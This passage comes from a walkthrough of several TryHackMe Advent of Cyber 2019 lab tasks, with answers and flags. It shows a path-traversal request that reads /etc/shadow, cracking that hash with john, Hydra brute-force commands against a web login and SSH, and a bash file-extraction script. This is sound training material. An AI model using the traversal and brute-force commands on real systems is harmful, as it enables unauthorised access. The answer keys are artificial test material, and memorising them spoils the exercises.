Q2: What is in the file?
A: mcchef
**Solution**
So now we see the key `employee_names.txt` from previous question so now we can see its content using the following URL `https://advent-bucket-one.s3.amazonaws.com/employee_names.txt`

## Task 20  [Day 15] LFI

![](https://i.imgur.com/hsmLEZr.png)

Elf Charlie likes to make notes and store them on his server. Are you able to take advantage of this functionality and crack his password? 

Read the supporting materials [here](https://blog.tryhackme.com/lfi/).

**Answer the questions below**

Q1:What is Charlie going to book a holiday to?
A: Hawaii
**Solution**
Visit the website and its first page have the answer

![Task20Hawaeii](https://user-images.githubusercontent.com/85181215/134503300-2230eb3c-c18d-47d1-b268-eb64f921cfcd.png)

Q2: Read /etc/shadow and crack Charlies password.
A: password1
**Solution**
Go to the following link to get the shadow file 
http://IP-Here/get-file/%2fetc%2fshadow
When you got the shadow file so you can copy the password hash for `charlie` user and save it in a file and then use the following command to get the password
```shell
$ john hash.txt --wordlist=/usr/share/rockyou.txt
```

Q3: What is flag1.txt?
A: THM{4ea2adf842713ad3ce0c1f05ef12256d}
**Solution**
So from above we have the charlie password so we can ssh to the system because from nmap scan report we see port 22 is open for ssh so we can use it like the following command
```shell
$ ssh charlie@$IP_HERE
```

## Task 21  [Day 16] File Confusion

The Christmas monster got access to some files and made a lot of weird changes_. Can you help fix these changes?

Use a (python) script to do the following:

-   extract all the files in the archives 
-   extract metadata from the files 
-   extract text from the files

Use the questions to guide you on how to write the script. Check out the supporting material [here](https://docs.google.com/document/d/13eYEcqpyp3fIAnaDR8PHz6qibBJJwf2Vp5M77KkEKtw/edit#).

**Answer the questions below**

Q1: How many files did you extract(excluding all the .zip files)
A: 50

Q2: How many files contain Version: 1.1 in their metadata?
A: 3 

Q3: Which file contains the password?
A: dL6w.txt

**Solution/Script**

I don't know python so i use bash scripting to solve that problem but i also don't know bash scripting that much but they are a little easy because they use Linux command and that we use daily so this will solve our problem but i google to know about `while-read` loop with the help of that i made the following script

```bash
#!/bin/bash


mkdir -p zip/extract

cd zip

unzip ../final-final-compressed.zip

cd extract

zip_files= ls /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip > temp.txt


#filename= temp.txt
while read line;
do
	
	echo '[+] ----------------------------------------------------';

	unzip /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip/$line 

done < temp.txt
 
 rm temp.txt 


echo '[+] ----------------------------------------------------';

text_files= ls > textFiles 

while read files;
do
	exiftool $files | egrep -i '1.1' 
done < textFiles

echo ''

while read files;
do
	
	cat $files | egrep -i 'password' && echo 'File Contains the Password is [ '$files ']'

done < textFiles

echo -e '\n[+] Extracted Files\n'
echo -e '====='

ls  /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip/extract | wc -l
echo -e '====='


rm -r /home/waheed/THM/'Advent of Cyber 1 2019'/task21/zip



echo ''
echo '================================================================'
echo 'Finished'
echo '================================================================'
```

Its Output is like this

![image](https://user-images.githubusercontent.com/85181215/134694684-f36dd7eb-0c8f-4325-908c-7ac576eade5b.png)

## Task 22 [Day 17] Hydra-ha-ha-haa 

![image](https://user-images.githubusercontent.com/85181215/134759373-cbfa0d2e-7087-4313-96b9-a0abd8a45dda.png)


You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!

Use Hydra to brute force Elf Molly's password. Use the rockyou.txt password list, which can be found here.

Supporting materials can be found here.

This machine will take between 3-4 minutes to boot.

**Answer the questions below**

Q1: Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH).
**Hint: If you've tried more than 30 passwords from RockYou.txt, you are doing something wrong!**

A:  THM{2673a7dd116de68e85c48ec0b1f2612e}
**Solution**
Use the following hydra command to get the login password for `molly` user 
```hydra 
$ hydra -l "molly" -P /usr/share/wordlists/rockyou.txt 10.10.210.167 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -I
```
When you got the credential login to web and got the flag there

Q2: Use Hydra to bruteforce molly's SSH password. What is flag 2?

A:THM{c8eeb0468febbadea859baeb33b2541b}

**Solution**
Use the following hydra command to bruteforce `molly` user ssh password
```
$ hydra -l "molly" -P /usr/share/wordlists/rockyou.txt 10.10.210.167 -t 4 ssh
```
When you got the credentials login to ssh using the following command 
```ssh
$ ssh molly@10.10.210.167
```
When successfully login to ssh see the flag in molly home directory using the command `cat flag2.txt`













